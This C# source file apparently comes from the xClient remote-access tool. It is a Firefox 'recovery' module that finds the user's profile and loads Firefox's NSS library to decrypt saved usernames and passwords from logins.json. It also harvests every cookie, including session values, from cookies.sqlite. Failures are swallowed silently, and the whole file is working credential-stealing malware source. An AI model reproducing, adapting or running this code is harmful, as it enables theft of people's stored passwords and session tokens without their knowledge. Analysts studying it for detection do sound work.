using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using xClient.Core.Data;
using xClient.Core.Recovery.Utilities;
using xClient.Core.Utilities;
using System.Diagnostics;
using xClient.Core.Extensions;
using xClient.Core.Helper;

namespace xClient.Core.Recovery.Browsers
{
    /// <summary>
    /// A small class to recover Firefox Data
    /// </summary>
    public static class Firefox
    {
        private static IntPtr nssModule;

        private static DirectoryInfo firefoxPath;
        private static DirectoryInfo firefoxProfilePath;

        private static FileInfo firefoxLoginFile;
        private static FileInfo firefoxCookieFile;

        static Firefox()
        {
            try
            {
                firefoxPath = GetFirefoxInstallPath();
                if (firefoxPath == null)
                    throw new NullReferenceException("Firefox is not installed, or the install path could not be located");

                firefoxProfilePath = GetProfilePath();
                if (firefoxProfilePath == null)
                    throw new NullReferenceException("Firefox does not have any profiles, has it ever been launched?");

                firefoxLoginFile = GetFile(firefoxProfilePath, "logins.json");
                if (firefoxLoginFile == null)
                    throw new NullReferenceException("Firefox does not have any logins.json file");

                firefoxCookieFile = GetFile(firefoxProfilePath, "cookies.sqlite");
                if (firefoxCookieFile == null)
                    throw new NullReferenceException("Firefox does not have any cookie file");
            }
            catch (Exception)
            {

            }
        }

        #region Public Members
        /// <summary>
        /// Recover Firefox Passwords from logins.json
        /// </summary>
        /// <returns>List of Username/Password/Host</returns>
        public static List<RecoveredAccount> GetSavedPasswords()
        {
            List<RecoveredAccount> firefoxPasswords = new List<RecoveredAccount>();
            try
            {
                // init libs
                InitializeDelegates(firefoxProfilePath, firefoxPath);

                JsonFFData ffLoginData = new JsonFFData();

                using (StreamReader sr = new StreamReader(firefoxLoginFile.FullName))
                {
                    string json = sr.ReadToEnd();
                    ffLoginData = JsonUtil.Deserialize<JsonFFData>(json);
                }

                foreach (Login data in ffLoginData.logins)
                {
                    string username = Decrypt(data.encryptedUsername);
                    string password = Decrypt(data.encryptedPassword);
                    Uri host = new Uri(data.formSubmitURL);

                    firefoxPasswords.Add(new RecoveredAccount() { URL = host.AbsoluteUri, Username = username, Password = password, Application = "Firefox" });
                }
            }
            catch (Exception)
            {
            }
            return firefoxPasswords;
        }

        /// <summary>
        /// Recover Firefox Cookies from the SQLite3 Database
        /// </summary>
        /// <returns>List of Cookies found</returns>
        public static List<FirefoxCookie> GetSavedCookies()
        {
            List<FirefoxCookie> data = new List<FirefoxCookie>();
            SQLiteHandler sql = new SQLiteHandler(firefoxCookieFile.FullName);
            if (!sql.ReadTable("moz_cookies"))
                throw new Exception("Could not read cookie table");

            int totalEntries = sql.GetRowCount();

            for (int i = 0; i < totalEntries; i++)
            {
                try
                {
                    string h = sql.GetValue(i, "host");
                    //Uri host = new Uri(h);
                    string name = sql.GetValue(i, "name");
                    string val = sql.GetValue(i, "value");
                    string path = sql.GetValue(i, "path");

                    bool secure = sql.GetValue(i, "isSecure") == "0" ? false : true;
                    bool http = sql.GetValue(i, "isSecure") == "0" ? false : true;

                    // if this fails we're in deep shit
                    long expiryTime = long.Parse(sql.GetValue(i, "expiry"));
                    long currentTime = ToUnixTime(DateTime.Now);
                    DateTime exp = FromUnixTime(expiryTime);
                    bool expired = currentTime > expiryTime;

                    data.Add(new FirefoxCookie()
                    {
                        Host = h,
                        ExpiresUTC = exp,
                        Expired = expired,
                        Name = name,
                        Value = val,
                        Path = path,
                        Secure = secure,
                        HttpOnly = http
                    });
                }
                catch (Exception)
                {
                    return data;
                }
            }
            return data;
        }
        #endregion

        #region Functions
        private static void InitializeDelegates(DirectoryInfo firefoxProfilePath, DirectoryInfo firefoxPath)
        {
            //Return if under firefox 35 (35+ supported)
            //Firefox changes their DLL heirarchy/code with different releases
            //So we need to avoid trying to load a DLL in the wrong order
            //To prevent pop up saying it could not load the DLL
            if (new Version(FileVersionInfo.GetVersionInfo(firefoxPath.FullName + "\\firefox.exe").FileVersion).Major < new Version("35.0.0").Major)
                return;

            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcr100.dll");
            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcp100.dll");
            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcr120.dll");
            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcp120.dll");
            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\mozglue.dll");
            nssModule = NativeMethods.LoadLibrary(firefoxPath.FullName + "\\nss3.dll");
            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "NSS_Init");
            NSS_InitPtr NSS_Init = (NSS_InitPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitPtr));
            NSS_Init(firefoxProfilePath.FullName);
            long keySlot = PK11_GetInternalKeySlot();
            PK11_Authenticate(keySlot, true, 0);
        }
        private static DateTime FromUnixTime(long unixTime)
        {
            DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            return epoch.AddSeconds(unixTime);
        }
        private static long ToUnixTime(DateTime value)
        {
            TimeSpan span = (value - new DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime());
            return (long)span.TotalSeconds;
        }
        #endregion

        #region File Handling
        private static DirectoryInfo GetProfilePath()
        {
            string raw = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles";
            if (!Directory.Exists(raw))
                throw new Exception("Firefox Application Data folder does not exist!");
            DirectoryInfo profileDir = new DirectoryInfo(raw);

            DirectoryInfo[] profiles = profileDir.GetDirectories();
            if (profiles.Length == 0)
                throw new IndexOutOfRangeException("No Firefox profiles could be found");

            // return first profile
            return profiles[0];
        }
        private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
        {
            foreach (FileInfo file in profilePath.GetFiles(searchTerm))
            {
                return file;
            }
            throw new Exception("No Firefox logins.json was found");
        }
        private static DirectoryInfo GetFirefoxInstallPath()
        {
            // get firefox path from registry
            using (RegistryKey key = PlatformHelper.Is64Bit ?
                RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine,
                    @"SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox") :
                RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine,
                    @"SOFTWARE\Mozilla\Mozilla Firefox"))
            {
                if (key == null) return null;

                string[] installedVersions = key.GetSubKeyNames();

                // we'll take the first installed version, people normally only have one
                if (installedVersions.Length == 0)
                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");

                using (RegistryKey mainInstall = key.OpenSubKey(installedVersions[0]))
                {
                    // get install directory
                    string installPath = mainInstall.OpenReadonlySubKeySafe("Main")
                        .GetValueSafe("Install Directory");

                    if (string.IsNullOrEmpty(installPath))
                        throw new NullReferenceException("Install string was null or empty");

                    firefoxPath = new DirectoryInfo(installPath);
                }
            }
            return firefoxPath;
        }
        #endregion

        #region WinApi
        // Credit: http://www.pinvoke.net/default.aspx/kernel32.loadlibrary
        private static IntPtr LoadWin32Library(string libPath)
        {
            if (String.IsNullOrEmpty(libPath))
                throw new ArgumentNullException("libPath");

            IntPtr moduleHandle = NativeMethods.LoadLibrary(libPath);
            if (moduleHandle == IntPtr.Zero)
            {
                var lasterror = Marshal.GetLastWin32Error();
                var innerEx = new Win32Exception(lasterror);
                innerEx.Data.Add("LastWin32Error", lasterror);

                throw new Exception("can't load DLL " + libPath, innerEx);
            }
            return moduleHandle;
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long NSS_InitPtr(string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int PK11SDR_DecryptPtr(ref TSECItem data, ref TSECItem result, int cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_GetInternalKeySlotPtr();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

        [StructLayout(LayoutKind.Sequential)]
        private struct TSECItem
        {
            public int SECItemType;
            public int SECItemData;
            public int SECItemLen;
        }

        #endregion

        #region JSON
        // json deserialize classes
       /* private class JsonFFData
        {

            public long nextId;
            public LoginData[] logins;
            public string[] disabledHosts;
            public int version;

        }
        private class LoginData
        {

            public long id;
            public string hostname;
            public string url;
            public string httprealm;
            public string formSubmitURL;
            public string usernameField;
            public string passwordField;
            public string encryptedUsername;
            public string encryptedPassword;
            public string guid;
            public int encType;
            public long timeCreated;
            public long timeLastUsed;
            public long timePasswordChanged;
            public long timesUsed;

        }*/
        public class Login
        {
            public int id { get; set; }
            public string hostname { get; set; }
            public object httpRealm { get; set; }
            public string formSubmitURL { get; set; }
            public string usernameField { get; set; }
            public string passwordField { get; set; }
            public string encryptedUsername { get; set; }
            public string encryptedPassword { get; set; }
            public string guid { get; set; }
            public int encType { get; set; }
            public long timeCreated { get; set; }
            public long timeLastUsed { get; set; }
            public long timePasswordChanged { get; set; }
            public int timesUsed { get; set; }
        }

        public class JsonFFData
        {
            public int nextId { get; set; }
            public List<Login> logins { get; set; }
            public List<object> disabledHosts { get; set; }
            public int version { get; set; }
        }
        #endregion

        #region Delegate Handling
        // Credit: http://www.codeforge.com/article/249225
        private static long PK11_GetInternalKeySlot()
        {
            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "PK11_GetInternalKeySlot");
            PK11_GetInternalKeySlotPtr ptr = (PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_GetInternalKeySlotPtr));
            return ptr();
        }
        private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "PK11_Authenticate");
            PK11_AuthenticatePtr ptr = (PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_AuthenticatePtr));
            return ptr(slot, loadCerts, wincx);
        }
        private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "NSSBase64_DecodeBuffer");
            NSSBase64_DecodeBufferPtr ptr = (NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSSBase64_DecodeBufferPtr));
            return ptr(arenaOpt, outItemOpt, inStr, inLen);
        }
        private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "PK11SDR_Decrypt");
            PK11SDR_DecryptPtr ptr = (PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11SDR_DecryptPtr));
            return ptr(ref data, ref result, cx);
        }
        private static string Decrypt(string cypherText)
        {
            StringBuilder sb = new StringBuilder(cypherText);
            int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length);
            TSECItem tSecDec = new TSECItem();
            TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
            if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
            {
                if (tSecDec.SECItemLen != 0)
                {
                    byte[] bvRet = new byte[tSecDec.SECItemLen];
                    Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                    return Encoding.UTF8.GetString(bvRet);
                }
            }
            return null;
        }
        #endregion
    }
    public class FirefoxPassword
    {
        public string Username { get; set; }
        public string Password { get; set; }
        public Uri Host { get; set; }
        public override string ToString()
        {
            return string.Format("User: {0}{3}Pass: {1}{3}Host: {2}", Username, Password, Host.Host, Environment.NewLine);
        }
    }
    public class FirefoxCookie
    {
        public string Host { get; set; }
        public string Name { get; set; }
        public string Value { get; set; }
        public string Path { get; set; }
        public DateTime ExpiresUTC { get; set; }
        public bool Secure { get; set; }
        public bool HttpOnly { get; set; }
        public bool Expired { get; set; }

        public override string ToString()
        {
            return string.Format("Domain: {1}{0}Cookie Name: {2}{0}Value: {3}{0}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", Environment.NewLine, Host, Name, Value, Path, Expired, HttpOnly, Secure);
        }
    }
}
